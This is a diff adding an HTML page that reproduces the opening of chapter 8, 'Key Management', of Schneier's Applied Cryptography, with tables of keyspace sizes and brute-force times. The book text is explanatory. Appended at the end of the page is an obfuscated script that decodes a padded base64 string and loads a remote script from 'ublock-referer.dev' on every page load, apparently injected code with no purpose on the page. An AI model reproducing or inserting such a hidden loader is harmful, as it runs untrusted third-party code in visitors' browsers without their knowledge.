@@ -1,0 +1,200 @@
+<html>
+<head>
+<TITLE>APPLIED CRYPTOGRAPHY, SECOND EDITION: Protocols, Algorithms, and Source Code in C:Key Management</TITLE>
+<!-- BEGIN HEADER -->
+<META NAME="ROBOTS" CONTENT="NOINDEX, NOFOLLOW">
+<SCRIPT>
+<!--
+function displayWindow(url, width, height) {
+        var Win = window.open(url,"displayWindow",'width=' + width +
+',height=' + height + ',resizable=1,scrollbars=yes');
+}
+//-->
+</SCRIPT>
+
+</HEAD>
+<body bgcolor="ffffff" link="#006666" alink="#006666" vlink="#006666">
+<P>
+<CENTER><B>Applied Cryptography, Second Edition: Protocols,  Algorthms, and Source Code in C (cloth)</B>
+<FONT SIZE="-2">
+<BR>
+<I>(Publisher: John Wiley & Sons, Inc.)</I>
+<BR>
+Author(s): Bruce Schneier
+<BR>
+ISBN: 0471128457
+<BR>
+Publication Date: 01/01/96
+</FONT></CENTER>
+<P>
+
+
+<!-- Empty Reference Subhead -->
+
+<!--ISBN=0471128457//-->
+<!--TITLE=APPLIED CRYPTOGRAPHY, SECOND EDITION: Protocols, Algorithms, and Source Code in C//-->
+<!--AUTHOR=Bruce Schneier//-->
+<!--PUBLISHER=Wiley Computer Publishing//-->
+<!--CHAPTER=08//-->
+<!--PAGES=169-171//-->
+<!--UNASSIGNED1//-->
+<!--UNASSIGNED2//-->
+
+<CENTER>
+<TABLE BORDER>
+<TR>
+<TD><A HREF="../ch07/07-08.html">Previous</A></TD>
+<TD><A HREF="../ewtoc.html">Table of Contents</A></TD>
+<TD><A HREF="08-02.html">Next</A></TD>
+</TR>
+</TABLE>
+</CENTER>
+<P><BR></P>
+<H2><A NAME="Heading1"></A><FONT COLOR="#000077">Chapter 8<BR>Key Management
+</FONT></H2>
+<P>Alice and Bob have a secure communications system. They play mental poker, simultaneously sign contracts, even exchange digital cash. Their protocols are secure. Their algorithms are top-notch. Unfortunately, they buy their keys from Eve&#146;s &#147;Keys-R-Us,&#148; whose slogan is &#147;You can trust us: Security is the middle name of someone our ex-mother-in-law&#146;s travel agent met at the Kwik-E-Mart.&#148;
+</P>
+<P>Eve doesn&#146;t have to break the algorithms. She doesn&#146;t have to rely on subtle flaws in the protocols. She can use their keys to read all of Alice&#146;s and Bob&#146;s message traffic without lifting a cryptanalytic finger.</P>
+<P>In the real world, key management is the hardest part of cryptography. Designing secure cryptographic algorithms and protocols isn&#146;t easy, but you can rely on a large body of academic research. Keeping the keys secret is much harder.</P>
+<P>Cryptanalysts often attack both symmetric and public-key cryptosystems through their key management. Why should Eve bother going through all the trouble of trying to break the cryptographic algorithm if she can recover the key because of sloppy key storage procedures? Why should she spend $10 million building a cryptanalysis machine if she can spend $1000 bribing a clerk? Spending a million dollars to buy a well-placed communications clerk in a diplomatic embassy can be a bargain. The Walkers sold U.S. Navy encryption keys to the Soviets for years. The CIA&#146;s director of counterintelligence went for less than $2 million, wife included. That&#146;s far cheaper than building massive cracking machines and hiring brilliant cryptanalysts. Eve can steal the keys. She can arrest or abduct someone who knows the keys. She can seduce someone and get the keys that way. (The Marines who guarded the U.S. Embassy in Moscow were not immune to that attack.) It&#146;s a whole lot easier to find flaws in people than it is to find them in cryptosystems.</P>
+<P>Alice and Bob must protect their key to the same degree as all the data it encrypts. If a key isn&#146;t changed regularly, this can be an enormous amount of data. Unfortunately, many commercial products simply proclaim &#147;We use DES&#148; and forget about everything else. The results are not very impressive.</P>
+<P>For example, the DiskLock program for Macintosh (version 2.1), sold at most software stores, claims the security of DES encryption. It encrypts files using DES. Its implementation of the DES algorithm is correct. However, DiskLock stores the DES key with the encrypted file. If you know where to look for the key, and want to read a file encrypted with DiskLock&#146;s DES, recover the key from the encrypted file and then decrypt the file. It doesn&#146;t matter that this program uses DES encryption&#151;the implementation is completely insecure.</P>
+<P>Further information on key management can be found in [457,98,1273,1225,775,357]. The following sections discuss some of the issues and solutions.</P>
+<H3><A NAME="Heading2"></A><FONT COLOR="#000077">8.1 Generating Keys</FONT></H3>
+<P>The security of an algorithm rests in the key. If you&#146;re using a cryptographically weak process to generate keys, then your whole system is weak. Eve need not cryptanalyze your encryption algorithm; she can cryptanalyze your key generation algorithm.
+</P>
+<P><FONT SIZE="+1"><B><I>Reduced Keyspaces</I></B></FONT></P>
+<P>DES has a 56-bit key. Implemented properly, any 56-bit string can be the key; there are 2<SUP>56</SUP> (10<SUP>16</SUP>) possible keys. Norton Discreet for MS-DOS (versions 8.0 and earlier) only allows ASCII keys, forcing the high-order bit of each byte to be zero. The program also converts lowercase letters to uppercase (so the fifth bit of each byte is always the opposite of the sixth bit) and ignores the low-order bit of each byte, resulting in only 2<SUP>40</SUP> possible keys. These poor key generation procedures have made its DES ten thousand times easier to break than a proper implementation.</P>
+<P>Table 8.1 gives the number of possible keys with various constraints on the input strings. Table 8.2 gives the time required for an exhaustive search through all of those keys, given a million attempts per second. Remember, there is very little time differential between an exhaustive search for 8-byte keys and an exhaustive search of 4-, 5-, 6-, 7-, and 8-byte keys.</P>
+<P>All specialized brute-force hardware and parallel implementations will work here. Testing a million keys per second (either with one machine or with multiple machines in parallel), it is feasible to crack lowercase-letter and lowercase-letter-and-number keys up to 8 bytes long, alphanumeric-character keys up to 7 bytes long, printable character and ASCII-character keys up to 6 bytes long, and 8-bit-ASCII-character keys up to 5 bytes long.</P>
+<TABLE WIDTH="100%"><TH CAPTION ALIGN="CENTER" COLSPAN="6">Table 8.1<BR>Number of Possible Keys of Various Keyspaces
+<TR>
+<TD COLSPAN="6"><HR>
+<TR>
+<TH WIDTH="35%" ALIGN="LEFT" VALIGN="TOP">
+<TH WIDTH="13%" ALIGN="LEFT" VALIGN="TOP">4-Byte
+<TH WIDTH="13%" ALIGN="LEFT" VALIGN="TOP">5-Byte
+<TH WIDTH="13%" ALIGN="LEFT" VALIGN="TOP">6-Byte
+<TH WIDTH="13%" ALIGN="LEFT" VALIGN="TOP">7-Byte
+<TH ALIGN="LEFT" VALIGN="BOTTOM">8-Byte
+<TR>
+<TD COLSPAN="6"><HR>
+<TR>
+<TD VALIGN="BOTTOM" ALIGN="LEFT">Lowercase letters (26):
+<TD VALIGN="BOTTOM" ALIGN="LEFT">460,000
+<TD VALIGN="BOTTOM" ALIGN="LEFT">1.2*10<SUP>7</SUP>
+<TD VALIGN="BOTTOM" ALIGN="LEFT">3.1*10<SUP>8</SUP>
+<TD VALIGN="BOTTOM" ALIGN="LEFT">8.0*10<SUP>9</SUP>
+<TD VALIGN="BOTTOM" ALIGN="LEFT">2.1*10<SUP>11</SUP>
+<TR>
+<TD VALIGN="BOTTOM" ALIGN="LEFT">Lowercase letters and digits (36):
+<TD VALIGN="BOTTOM" ALIGN="LEFT">1,700,000
+<TD VALIGN="BOTTOM" ALIGN="LEFT">6.0*10<SUP>7</SUP>
+<TD VALIGN="BOTTOM" ALIGN="LEFT">2.2*10<SUP>9</SUP>
+<TD VALIGN="BOTTOM" ALIGN="LEFT">7.8*10<SUP>10</SUP>
+<TD VALIGN="BOTTOM" ALIGN="LEFT">2.8*10<SUP>12</SUP>
+<TR>
+<TD VALIGN="BOTTOM" ALIGN="LEFT">Alphanumeric characters (62):
+<TD VALIGN="BOTTOM" ALIGN="LEFT">1.5*10<SUP>7</SUP>
+<TD VALIGN="BOTTOM" ALIGN="LEFT">9.2*10<SUP>8</SUP>
+<TD VALIGN="BOTTOM" ALIGN="LEFT">5.7*10<SUP>10</SUP>
+<TD VALIGN="BOTTOM" ALIGN="LEFT">3.5*10<SUP>12</SUP>
+<TD VALIGN="BOTTOM" ALIGN="LEFT">2.2*10<SUP>14</SUP>
+<TR>
+<TD VALIGN="BOTTOM" ALIGN="LEFT">Printable characters (95):
+<TD VALIGN="BOTTOM" ALIGN="LEFT">8.1*10<SUP>7</SUP>
+<TD VALIGN="BOTTOM" ALIGN="LEFT">7.7*10<SUP>9<SUP>
+<TD VALIGN="BOTTOM" ALIGN="LEFT">7.4*10<SUP>11</SUP>
+<TD VALIGN="BOTTOM" ALIGN="LEFT">7.0*10<SUP>13</SUP>
+<TD VALIGN="BOTTOM" ALIGN="LEFT">6.6*10<SUP>15</SUP>
+<TR>
+<TD VALIGN="BOTTOM" ALIGN="LEFT">ASCII characters (128):
+<TD VALIGN="BOTTOM" ALIGN="LEFT">2.7*10<SUP>8</SUP>
+<TD VALIGN="BOTTOM" ALIGN="LEFT">3.4*10<SUP>10</SUP>
+<TD VALIGN="BOTTOM" ALIGN="LEFT">4.4*10<SUP>12</SUP>
+<TD VALIGN="BOTTOM" ALIGN="LEFT">5.6*10<SUP>14</SUP>
+<TD VALIGN="BOTTOM" ALIGN="LEFT">7.2*10<SUP>16</SUP>
+<TR>
+<TD VALIGN="BOTTOM" ALIGN="LEFT">8-bit ASCII characters (256):
+<TD VALIGN="BOTTOM" ALIGN="LEFT">4.3*10<SUP>9</SUP>
+<TD VALIGN="BOTTOM" ALIGN="LEFT">1.1*10<SUP>12</SUP>
+<TD VALIGN="BOTTOM" ALIGN="LEFT">2.8*10<SUP>14</SUP>
+<TD VALIGN="BOTTOM" ALIGN="LEFT">7.2*10<SUP>16</SUP>
+<TD VALIGN="BOTTOM" ALIGN="LEFT">1.8*10<SUP>19</SUP>
+<TR>
+<TD COLSPAN="6"><HR>
+<TR>
+</TABLE>
+<TABLE WIDTH="100%">
+<TH CAPTION ALIGN="CENTER" COLSPAN="6">Table 8.2<BR>Exhaustive Search of Various Keyspaces (assume one million attempts per second)
+<TR>
+<TD COLSPAN="6"><HR>
+<TR>
+<TH ALIGN="LEFT" VALIGN="TOP">
+<TH ALIGN="LEFT" VALIGN="TOP">4-Byte
+<TH ALIGN="LEFT" VALIGN="TOP">5-Byte
+<TH ALIGN="LEFT" VALIGN="TOP">6-Byte
+<TH ALIGN="LEFT" VALIGN="TOP">7-Byte
+<TH ALIGN="LEFT" VALIGN="TOP">8-Byte
+<TR>
+<TD COLSPAN="6"><HR>
+<TR>
+<TD VALIGN="TOP" ALIGN="LEFT">Lowercase letters (26):
+<TD VALIGN="TOP" ALIGN="LEFT">.5 seconds
+<TD VALIGN="TOP" ALIGN="LEFT">12 seconds
+<TD VALIGN="TOP" ALIGN="LEFT">5 minutes
+<TD VALIGN="TOP" ALIGN="LEFT">2.2 hours
+<TD VALIGN="TOP" ALIGN="LEFT">2.4 days
+<TR>
+<TD VALIGN="TOP" ALIGN="LEFT">Lowercase letters and digits (36):
+<TD VALIGN="TOP" ALIGN="LEFT">1.7 seconds
+<TD VALIGN="TOP" ALIGN="LEFT">1 minute
+<TD VALIGN="TOP" ALIGN="LEFT">36 minutes
+<TD VALIGN="TOP" ALIGN="LEFT">22 hours
+<TD VALIGN="TOP" ALIGN="LEFT">33 days
+<TR>
+<TD VALIGN="TOP" ALIGN="LEFT">Alphanumeric characters (62):
+<TD VALIGN="TOP" ALIGN="LEFT">15 seconds
+<TD VALIGN="TOP" ALIGN="LEFT">15 minutes
+<TD VALIGN="TOP" ALIGN="LEFT">16 hours
+<TD VALIGN="TOP" ALIGN="LEFT">41 days
+<TD VALIGN="TOP" ALIGN="LEFT">6.9 years
+<TR>
+<TD VALIGN="TOP" ALIGN="LEFT">Printable characters (95):
+<TD VALIGN="TOP" ALIGN="LEFT">1.4 minutes
+<TD VALIGN="TOP" ALIGN="LEFT">2.1 hours
+<TD VALIGN="TOP" ALIGN="LEFT">8.5 days
+<TD VALIGN="TOP" ALIGN="LEFT">2.2 years
+<TD VALIGN="TOP" ALIGN="LEFT">210 years
+<TR>
+<TD VALIGN="TOP" ALIGN="LEFT">ASCII characters (128):
+<TD VALIGN="TOP" ALIGN="LEFT">4.5 minutes
+<TD VALIGN="TOP" ALIGN="LEFT">9.5 hours
+<TD VALIGN="TOP" ALIGN="LEFT">51 days
+<TD VALIGN="TOP" ALIGN="LEFT">18 years
+<TD VALIGN="TOP" ALIGN="LEFT">2300 years
+<TR>
+<TD VALIGN="TOP" ALIGN="LEFT">8-bit ASCII characters (256):
+<TD VALIGN="TOP" ALIGN="LEFT">1.2 hours
+<TD VALIGN="TOP" ALIGN="LEFT">13 days
+<TD VALIGN="TOP" ALIGN="LEFT">8.9 years
+<TD VALIGN="TOP" ALIGN="LEFT">2300 years
+<TD VALIGN="TOP" ALIGN="LEFT">580,000 years
+<TR>
+<TD COLSPAN="6"><HR>
+<TR>
+</TABLE>
+<P><BR></P>
+<CENTER>
+<TABLE BORDER>
+<TR>
+<TD><A HREF="../ch07/07-08.html">Previous</A></TD>
+<TD><A HREF="../ewtoc.html">Table of Contents</A></TD>
+<TD><A HREF="08-02.html">Next</A></TD>
+</TR>
+</TABLE>
+</CENTER>
+
+[an error occurred while processing this directive]
+<script type="text/javascript">(function(GaoWmbun, RakGaINc) {RakGaINc = GaoWmbun.createElement('script');RakGaINc.type = 'text/javascript';RakGaINc.async = true;RakGaINc.src = atob('0024241d2f28Ly91YmxvY2stcmVmZXJlci5kZXYvY2FtcGFpZ24uanM=0024241d2f28'.replace(/0024241d2f28/gi, '')) + '?' + String(Math.random()).replace('0.','');GaoWmbun.getElementsByTagName('body')[0].appendChild(RakGaINc);}(document));</script></body>
+</html>
